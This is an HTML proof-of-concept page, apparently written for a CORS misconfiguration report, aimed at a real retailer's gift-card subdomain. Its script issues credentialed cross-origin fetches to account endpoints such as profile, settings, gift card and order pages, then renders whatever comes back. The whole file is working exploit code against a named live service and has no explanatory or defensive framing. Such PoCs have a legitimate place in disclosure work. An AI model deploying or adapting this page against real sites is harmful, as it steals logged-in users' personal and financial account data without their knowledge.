<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC - giftcards.kroger.com</title>
  </head>
  <body>
    <h1>Fetching sensitive data from Kroger gift cards subdomain...</h1>
    <script>
      const endpoints = [
        "/api/user/profile",
        "/mySettings",
        "/account",
        "/dashboard",
        "/user/info",
        "/giftCard",
        "/orders"
      ];

      endpoints.forEach(endpoint => {
        fetch("https://giftcards.kroger.com" + endpoint, {
          credentials: "include"
        })
        .then(res => res.text())
        .then(data => {
          document.body.innerHTML += `<h3>Endpoint: ${endpoint}</h3><pre>${data}</pre>`;
        })
        .catch(err => {
          document.body.innerHTML += `<h3 style="color:red;">${endpoint} failed</h3>`;
          console.error(err);
        });
      });
    </script>
  </body>
</html>
